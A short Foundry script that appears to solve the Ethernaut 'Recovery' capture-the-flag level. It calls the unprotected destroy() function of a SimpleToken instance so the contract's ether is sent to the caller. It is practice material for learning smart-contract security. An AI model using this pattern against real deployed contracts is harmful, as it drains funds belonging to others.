// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {SimpleToken} from "../src/Lv-17/Recovery.sol";

contract RecoveryScript is Script {
    function run() public {
        vm.startBroadcast();
        //REPLACE ADDRESS WITH YOUR OWN SimpleToken INSTANCE ADDRESS
        SimpleToken token = SimpleToken(payable(0x69742BaFD34EC3922D957b9442131B4d169f574d));
        token.destroy(payable(msg.sender));
        vm.stopBroadcast();
    }
}
